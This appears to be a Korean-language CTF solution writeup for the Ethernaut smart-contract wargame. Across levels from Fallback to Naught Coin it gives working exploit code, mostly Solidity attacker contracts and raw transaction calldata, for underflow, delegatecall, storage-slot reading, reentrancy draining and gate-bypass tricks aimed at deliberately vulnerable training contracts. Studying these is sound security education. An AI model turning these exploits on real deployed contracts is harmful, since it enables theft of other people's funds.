# ethernaut-solve
https://ethernaut.openzeppelin.com/

### Hello Ethernaut
```
await contract.authenticate(await contract.address())
```

### Fallback
```
await sendTranscation({from:player, to:contract.address, value:1, data:"0xd7bb99ba"}) // call contribute
await sendTranscation({from:player, to:contract.address, value:1}) // fallback and take owner
await sendTranscation({from:player, to:contract.address, data:"0x3ccfd60b"}) // withdraw
```

### Fallout
낮은 버전 solidity에서 constructor 네이밍 실수
```
await sendTranscation({from:player, to:contract.address, data:"0x6fab5ddf"}) // call Fal1out
```

### Coin Flip
inner tx가 원하는 결과를 반환하지않으면 revert
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlipCaller {
    address public coinFlipAddress = 0x72C860e67CEdfbc8B6Cc2BF9eAf6173be9A758BB;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function callFlip() public {
        bytes memory data = abi.encodeWithSignature("flip(bool)", true);

        (bool success, bytes memory result) = coinFlipAddress.call(data);
        
        if(!abi.decode(result, (bool)) || !success) revert();
    }
}
```

### Telephone
msg.sender = 현재 함수를 직접 호출한 address

tx.origin = 트랜잭션 최초로 호출한 address
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TakeTelephone {
    address public telephone = 0x209eDa374a2DF5ADA2BDd32797763325865935ce;
    address public newOwner = 0x2C2307bb8824a0AbBf2CC7D76d8e63374D2f8446;

    function changeOwner() public {
        bytes memory data = abi.encodeWithSignature("changeOwner(address)", newOwner);

        (bool success, bytes memory result) = telephone.call(data);
        
        if(!success) revert();
    }
}
```

### Token
underflow를 활용한 토큰 탈취.
0.8부터는 해당 취약점은 개선됨.
```
const toAddress = '0xdead';
const toAddressPadded = '0'.repeat(24) + toAddress.slice(2).padStart(40, '0');

const value = 21;
const valuePadded = value.toString(16).padStart(64, '0');

const data = "0xa9059cbb" + toAddressPadded + valuePadded;
await sendTransaction({from:player, to:contract.address, data});
```

### Delegation
delegatecall은 현재 컨트랙트의 상태와 delegatedContract의 로직을 사용함.
```
const functionSignature = 'pwn()';
const functionSignatureHash = _ethers.utils.keccak256(_ethers.utils.toUtf8Bytes(functionSignature));
const functionSelector = functionSignatureHash.slice(0, 10);
await sendTransaction({from:player, to:contract.address, functionSignature});
```

### Force
selfdestruct를 이용하면 payable이 없는 CA도 eth를 강제 송금할 수 있음.

cacun 부터는 selfdestruct를 사용하더라도 CA owner에게 eth가 송금됨.

0.8.18부터는 selfdestruct가 deprecated됨. [EIP-6049](https://eips.ethereum.org/EIPS/eip-6049)
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TakeMyMoney{
    address public force = 0xe21D5CA1330133C3Fb78886Ad0a58aFf85ed3771;
    
    receive() external payable {
        selfdestruct(payable(force));
    }
}
```

### Vault
solidity에서 private된 변수이더라도 슬롯을 확인하면 해당 값을 확인할 수 있음.
```
web3.eth.getStorageAt("0x0d0938d123467f4eA72bfd008683EeEAf092Fa5E", 2); // "412076657279207374726f6e67207365637265742070617373776f7264203a29"
await sendTransaction({from:player, to:contract.address, data: "0xec9b5b3a"+"412076657279207374726f6e67207365637265742070617373776f7264203a29"})
```

### King
단순히 송금만한다면 제출 시, 다시 king의 권한을 탈취당함. king이 권한을 탈취하려할 때 tx가 성공하지못하도록 함.
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract IDontNeedMoney{
    address public king = 0xd91E4c9677AC67474a069E4A623e5382d1a6e4c6;
    
    function sendEth() public payable{
        (bool success, ) = king.call{value: msg.value}("");
        require(success, "Failed to send Ether");
    }

    receive() external payable {revert();}
    fallback() external payable {revert();}
}

await sendTransaction({from:player, to:"0x7Ae7F3c83AA535A448dC7B9C699970B5eECe18dc", data:"0x06e99fef", value:toWei("0.001000001")})
```

### Reentrance
재진입을 시도할 때는, tx가 사용할 수 있는 gas 한도를 설정해주는게 중요함. 
```
const toAddress = "0x85299fFfa575FfA9cAe9B186c812C905D98A49a1"
const toAddressPadded = '0'.repeat(24) + toAddress.slice(2).padStart(40, '0');

const functionSignature = 'donate(address)';
const functionSignatureHash = _ethers.utils.keccak256(_ethers.utils.toUtf8Bytes(functionSignature));
const functionSelector = functionSignatureHash.slice(0, 10);

await sendTransaction({from:player, to:contract.address, data:functionSelector+toAddressPadded, value:toWei("0.001")})
```

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

contract DoubleSpend {
    address public owner;
    address public target = 0x0d1B128F01A560FfB16b04548f0182C298AA52DB;
    uint256 amount = 0.001 ether;

    constructor() public{
        owner = msg.sender;
    }
    
    function callWithdraw() public {
        (bool success, ) = target.call{gas: 500000}(abi.encodeWithSignature("withdraw(uint256)", amount));
        require(success, "Withdraw call failed");
    }

    // Function to receive Ether
    receive() external payable {
        if (address(target).balance >= amount) {
            callWithdraw();
        }
    }

    function withdraw() public{
        require(owner == msg.sender, "not owner");
        selfdestruct(payable(owner));
    }
}

```

### Elevator
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Claimer is Building{
    bool isEntered = false;
    address public elevator = 0x592d6c1CD0C06a45135A59a33Cfd817d53c1A373;

    function callGoTo() public{
        (bool success,) = elevator.call(abi.encodeWithSignature("goTo(uint256)", 0));
    }
    function isLastFloor(uint256) external override  returns (bool){
        if(!isEntered){
            isEntered = true;
            return false;
        }
        return true;
    }
}
```

### Privacy
slot 구성에 대해서 배울 수 있는 문제
https://docs.soliditylang.org/en/v0.8.26/internals/layout_in_storage.html

```
//slot 구성
bool public locked = true; // 0th (32byte)
uint256 public ID = block.timestamp; // 1st (32byte)
uint8 private flattening = 10; // 2nd (1byte)
uint8 private denomination = 255; // 2nd (1byte)
uint16 private awkwardness = uint16(block.timestamp); // 2nd (2byte)
bytes32[3] private data; // data[0] = 3rd // data[1] = 4th // data[2] = 5th
```

```
const functionSignature = web3.eth.abi.encodeFunctionSignature("unlock(bytes16)")
const key = await web3.eth.getStorageAt(contract.address,5) 
const parameter = web3.eth.abi.encodeParameter('bytes16',key) // bytes는 32byte padding을 할 때, padEnd를 사용함.
await sendTransaction({from:player, to:contract.address, data:functionSignature+parameter.slice(2)})
```

### Gatekeeper one
조건 1. msg.sender != tx.origin -> 컨트랙트로부터 call 해야함
조건 2. 가스비가 8919로 나누어떨어져야함 -> 성공할 때까지 반복함
조건 3. byte 타입 캐스팅에 관한 문제

0xFFFFFFFF00000000 (8byte to hex)값 이후부터 uint16과 uint32는 오버플로우 발생

```
bytes8 = 64bit = 8byte
uint16 = 16bit = 2byte
uint32 = 32bit = 4byte
uint64 = 64bit = 8byte
uint200 = 200bit = 25byte
```

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GateBreaker{
    address public gateKeeper = 0x7Ed9884c1f79a2545afE713e557df7809e9d966D;
    bytes8 public gateKey = 0xFFFFFFFF00006E11;

    function breakGate() public{
        bool success = false;
        uint256 i=0;
        while(!success){
            (success, ) = gateKeeper.call{gas:819100 + i}(abi.encodeWithSignature("enter(bytes8)", gateKey));
            i++;
        }
    }
}
```

### Gatekeeper two
조건 1. msg.sender != tx.origin -> 컨트랙트로부터 call 해야함
조건 2. extcodesize(caller()) -> msg.sender가 컨트랙트가 아니여야함 -> delegatecall로 tx.origin을 바라보게함
조건 3. xor 연산의 값이 uint64의 최대값이여야함 -> 2^64 -> a^not(a)을 이용함

```
contract GateBreaker{
    address public gateKeeper = 0xDF91d8346755eF79F7381f57051a2B57a6C26D79;

    // call breakGate(0x4c6b05a886a7a99f)
    function breakGate(bytes8 _gateKey) public{
       (bool success, bytes memory data) = gateKeeper.delegatecall(abi.encodeWithSignature("enter(bytes8)", _gateKey));
    }
}
```

### Naught Coin
abstract contract의 public virtual function은 impl contract에서 호출가능.
다른 wallet approve로 권한 양도 후, transferFrom을 통해서 전송
